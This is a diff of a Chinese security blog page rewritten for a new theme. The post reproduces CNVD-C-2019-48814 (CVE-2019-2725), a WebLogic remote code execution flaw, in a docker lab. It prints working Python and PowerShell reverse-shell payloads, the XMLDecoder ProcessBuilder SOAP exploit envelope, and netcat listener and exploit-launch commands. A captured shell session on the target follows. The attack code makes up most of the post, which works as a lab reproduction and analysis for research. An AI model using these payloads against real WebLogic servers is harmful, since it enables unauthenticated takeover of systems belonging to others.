@@ -1,7 +1,113 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="microworld,bubbl3@foxmail.com"><title>CNVD-C-2019-48814 · damn1t</title><meta name="description" content="CNVD-C-2019-48814复现docker搭建环境：123456docker pull ismaleiva90/weblogic12docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:l"><meta name="keywords" content="security,pentest,personal"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">damn1t</a></h3><div class="description"><p>及时行乐.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>CNVD-C-2019-48814</a></h3></div><div class="post-content"><h1 id="CNVD-C-2019-48814复现"><a href="#CNVD-C-2019-48814复现" class="headerlink" title="CNVD-C-2019-48814复现"></a>CNVD-C-2019-48814复现</h1><p>docker搭建环境：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker pull ismaleiva90/weblogic12</span><br><span class="line"></span><br><span class="line">docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest</span><br><span class="line">http://localhost:49163/console</span><br><span class="line">User: weblogic</span><br><span class="line">Pass: welcome1</span><br></pre></td></tr></table></figure></p>
-<p>漏洞验证：登入-&gt;<a href="http://xx.xx.xx.xxx:49163/_async/AsyncResponseService" target="_blank" rel="noopener">http://xx.xx.xx.xxx:49163/_async/AsyncResponseService</a><br><img src="https://images.seebug.org/content/images/2019/05/01/1556688743000-3.png-w331s" alt=""><br>若出现如上述页面则可确定漏洞基本存在</p>
-<p>poc：<a href="https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py" target="_blank" rel="noopener">https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py</a><br>验证方式：<br>在攻击机开启本地监听，<code>nc -lvvp 2333</code><br>调用脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py -l 192.168.10.144 -p 2333 -r http://192.168.10.145:49163</span><br></pre></td></tr></table></figure></p>
-<p>这里似乎如果将监听地址写为<code>127.0.0.1</code>是不行的，只能改为在内网中的地址，拿到shell</p>
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>CNVD-C-2019-48814 · Mr.Long's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">longlongyu</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Long's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">CNVD-C-2019-48814</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-05-04</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="cve"> cve</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="CNVD-C-2019-48814复现"><a href="#CNVD-C-2019-48814复现" class="headerlink" title="CNVD-C-2019-48814复现"></a>CNVD-C-2019-48814复现</h1><p>docker搭建环境：</p>
+<pre><code>docker pull ismaleiva90/weblogic12
+
+docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest
+http://localhost:49163/console
+User: weblogic
+Pass: welcome1
+</code></pre><p>漏洞验证：登入-&gt;<a href="http://xx.xx.xx.xxx:49163/_async/AsyncResponseService" target="_blank" rel="noopener">http://xx.xx.xx.xxx:49163/_async/AsyncResponseService</a><br><img src="https://images.seebug.org/content/images/2019/05/01/1556688743000-3.png-w331s" alt=""><br>若出现如上述页面则可确定漏洞基本存在</p>
+<p>poc：<a href="https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py" target="_blank" rel="noopener">https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py</a><br>验证方式：<br>在攻击机开启本地监听，<code>nc -lvvp 2333</code><br>调用脚本：</p>
+<pre><code>python poc.py -l 192.168.10.144 -p 2333 -r http://192.168.10.145:49163
+</code></pre><p>这里似乎如果将监听地址写为<code>127.0.0.1</code>是不行的，只能改为在内网中的地址，拿到shell</p>
 <blockquote>
 <p>listening on [any] 2333 …<br>192.168.10.145: inverse host lookup failed: Unknown host<br>connect to [192.168.10.144] from (UNKNOWN) [192.168.10.145] 36844<br>sh: no job control in this shell<br>sh-4.2$ whoami<br>whoami<br>oracle<br>sh-4.2$ ls<br>ls<br>autodeploy<br>bin<br>common<br>config<br>console-ext<br>derby.log<br>fileRealm.properties<br>init-info<br>lib<br>nodemanager<br>security<br>servers<br>startWebLogic.sh<br>sh-4.2$ </p>
 </blockquote>
@@ -9,11 +115,62 @@
 <blockquote>
 <p>Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: Web Services). Supported versions that are affected are 10.3.6.0.0 and 12.1.3.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server</p>
 </blockquote>
-<p>poc分析：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def __init__(self, check, rhost, lhost, lport, windows):</span><br></pre></td></tr></table></figure></p>
-<p>url检查，测定漏洞点存在与否<br>目标地址，监听地址和端口<br><strong>windows</strong>则是检查目标的操作系统，默认为unix，若为windows则要添加参数<br>unix或linux下的shell生成方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self.cmd_payload = (</span><br><span class="line">    &quot;python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.&quot;</span><br><span class="line">    &quot;SOCK_STREAM);s.connect((\&quot;&#123;lhost&#125;\&quot;,&#123;lport&#125;));os.dup2(s.fileno(),0); os.dup2(&quot;</span><br><span class="line">    &quot;s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;&quot;</span><br><span class="line">).format(lhost=self.lhost, lport=self.lport)</span><br></pre></td></tr></table></figure></p>
-<p>windows下shell生成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">self.cmd_payload = (</span><br><span class="line">    r&quot;powershell -w hidden -nop -c function RSC&#123;if ($c.Connected -eq $true) &quot;</span><br><span class="line">    r&quot;&#123;$c.Close()&#125;;if ($p.ExitCode -ne $null) &#123;$p.Close()&#125;;exit;&#125;;$a=&apos;&quot; + self.lhost +&quot;&quot;</span><br><span class="line">    r&quot;&apos;;$p=&apos;&quot;+ self.lport + &quot;&apos;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a&quot;</span><br><span class="line">    r&quot;,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;&quot;</span><br><span class="line">    r&quot;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&apos;cmd.exe&apos;;&quot;</span><br><span class="line">    r&quot;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;&quot;</span><br><span class="line">    r&quot;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;&quot;</span><br><span class="line">    r&quot;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;&quot;</span><br><span class="line">    r&quot;while($os.Peek() -ne -1)&#123;$o += $e.GetString($os.Read())&#125;;&quot;</span><br><span class="line">    r&quot;$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;&quot;</span><br><span class="line">    r&quot;while (-not $d) &#123;if ($c.Connected -ne $true) &#123;RSC&#125;;$pos=0;$i=1; while (($i -gt 0)&quot;</span><br><span class="line">    r&quot; -and ($pos -lt $nb.Length)) &#123;$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;&quot;</span><br><span class="line">    r&quot;if (-not $pos -or $pos -eq 0) &#123;RSC&#125;;if ($nb[0..$($pos-1)] -contains 10) &#123;break&#125;&#125;;&quot;</span><br><span class="line">    r&quot;if ($pos -gt 0)&#123;$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if &quot;</span><br><span class="line">    r&quot;($p.ExitCode -ne $null)&#123;RSC&#125;else&#123;$o=$e.GetString($os.Read());while($os.Peek() -ne&quot;</span><br><span class="line">    r&quot; -1)&#123;$o += $e.GetString($os.Read());if ($o -eq $str) &#123;$o=&apos;&apos;&#125;&#125;;$s.Write($e.&quot;</span><br><span class="line">    r&quot;GetBytes($o),0,$o.length);$o=$null;$str=$null&#125;&#125;else&#123;RSC&#125;&#125;;&quot;</span><br></pre></td></tr></table></figure></p>
-<p>exp部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def get_process_builder_payload(self):</span><br><span class="line">        process_builder_payload = &apos;&apos;&apos;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">    &lt;soapenv:Header&gt; </span><br><span class="line">        &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">        &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">            &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">                    &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">                        &lt;string&gt;&#123;cmd_base&#125;&lt;/string&gt;</span><br><span class="line">                    &lt;/void&gt;</span><br><span class="line">                    &lt;void index=&quot;1&quot;&gt;</span><br><span class="line">                        &lt;string&gt;&#123;cmd_opt&#125;&lt;/string&gt;</span><br><span class="line">                    &lt;/void&gt;</span><br><span class="line">                    &lt;void index=&quot;2&quot;&gt;</span><br><span class="line">                        &lt;string&gt;&#123;cmd_payload&#125;&lt;/string&gt;</span><br><span class="line">                    &lt;/void&gt;</span><br><span class="line">                &lt;/array&gt;</span><br><span class="line">            &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">    &lt;/soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body&gt;</span><br><span class="line">    &lt;asy:onAsyncDelivery/&gt;</span><br><span class="line">    &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;&apos;&apos;&apos;</span><br><span class="line">        return process_builder_payload.format(cmd_base=self.cmd_base(), cmd_opt=self.cmd_opt(),</span><br><span class="line">                                      cmd_payload=self.cmd_payload)</span><br></pre></td></tr></table></figure></p>
-<p>执行的具体流程：<br><img src="https://images.seebug.org/content/images/2019/05/01/1556688745000-25.png-w331s" alt=""></p>
+<p>poc分析：</p>
+<pre><code>def __init__(self, check, rhost, lhost, lport, windows):
+</code></pre><p>url检查，测定漏洞点存在与否<br>目标地址，监听地址和端口<br><strong>windows</strong>则是检查目标的操作系统，默认为unix，若为windows则要添加参数<br>unix或linux下的shell生成方式：</p>
+<pre><code>            self.cmd_payload = (
+                &quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.&quot;
+                &quot;SOCK_STREAM);s.connect((\&quot;{lhost}\&quot;,{lport}));os.dup2(s.fileno(),0); os.dup2(&quot;
+                &quot;s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;
+            ).format(lhost=self.lhost, lport=self.lport)
+</code></pre><p>windows下shell生成：</p>
+<pre><code>            self.cmd_payload = (
+                r&quot;powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) &quot;
+                r&quot;{$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a=&#39;&quot; + self.lhost +&quot;&quot;
+                r&quot;&#39;;$p=&#39;&quot;+ self.lport + &quot;&#39;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a&quot;
+                r&quot;,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;&quot;
+                r&quot;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&#39;cmd.exe&#39;;&quot;
+                r&quot;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;&quot;
+                r&quot;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;&quot;
+                r&quot;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;&quot;
+                r&quot;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};&quot;
+                r&quot;$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;&quot;
+                r&quot;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0)&quot;
+                r&quot; -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;&quot;
+                r&quot;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};&quot;
+                r&quot;if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if &quot;
+                r&quot;($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne&quot;
+                r&quot; -1){$o += $e.GetString($os.Read());if ($o -eq $str) {$o=&#39;&#39;}};$s.Write($e.&quot;
+                r&quot;GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};&quot;
+</code></pre><p>exp部分：</p>
+<pre><code>def get_process_builder_payload(self):
+        process_builder_payload = &#39;&#39;&#39;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   
+    &lt;soapenv:Header&gt; 
+        &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;
+        &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;
+        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+            &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
+                &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
+                    &lt;void index=&quot;0&quot;&gt;
+                        &lt;string&gt;{cmd_base}&lt;/string&gt;
+                    &lt;/void&gt;
+                    &lt;void index=&quot;1&quot;&gt;
+                        &lt;string&gt;{cmd_opt}&lt;/string&gt;
+                    &lt;/void&gt;
+                    &lt;void index=&quot;2&quot;&gt;
+                        &lt;string&gt;{cmd_payload}&lt;/string&gt;
+                    &lt;/void&gt;
+                &lt;/array&gt;
+            &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
+        &lt;/work:WorkContext&gt;
+    &lt;/soapenv:Header&gt;
+    &lt;soapenv:Body&gt;
+    &lt;asy:onAsyncDelivery/&gt;
+    &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;&#39;&#39;&#39;
+        return process_builder_payload.format(cmd_base=self.cmd_base(), cmd_opt=self.cmd_opt(),
+                                      cmd_payload=self.cmd_payload)
+</code></pre><p>执行的具体流程：<br><img src="https://images.seebug.org/content/images/2019/05/01/1556688745000-25.png-w331s" alt=""></p>
 <p>分析参考：<br><a href="https://paper.seebug.org/909/#417" target="_blank" rel="noopener">https://paper.seebug.org/909/#417</a><br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725</a><br><a href="http://pupiles.com/xmldecoder.html" target="_blank" rel="noopener">http://pupiles.com/xmldecoder.html</a></p>
 <p>复现参考：<br><a href="https://www.o2oxy.cn/2204.html" target="_blank" rel="noopener">https://www.o2oxy.cn/2204.html</a></p>
-</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-05-04</span><i class="fa fa-tag"></i><a class="tag" href="/tags/cve/" title="cve">cve </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://microvorld.com/2019/05/04/cve/CNVD-C-2019-48814/,damn1t,CNVD-C-2019-48814,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2019/05/04/vulnerable/padding oracle attack/" title="padding oracle">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2019/05/03/靶机/hack the box邀请码获取和web challenge/" title="hack the box邀请码获取和web challenge">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/05/04/cve/CNVD-C-2019-48814/">http://microvorld.com/2019/05/04/cve/CNVD-C-2019-48814/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/05/04/vulnerable/padding oracle attack/" title="padding oracle"><span>< PreviousPost</span><br><span class="prevTitle">padding oracle</span></a><a class="nextSlogan" href="/2019/05/03/靶机/hack the box邀请码获取和web challenge/" title="hack the box邀请码获取和web challenge"><span>NextPost ></span><br><span class="nextTitle">hack the box邀请码获取和web challenge</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CNVD-C-2019-48814复现"><span class="toc-number">1.</span> <span class="toc-text">CNVD-C-2019-48814复现</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
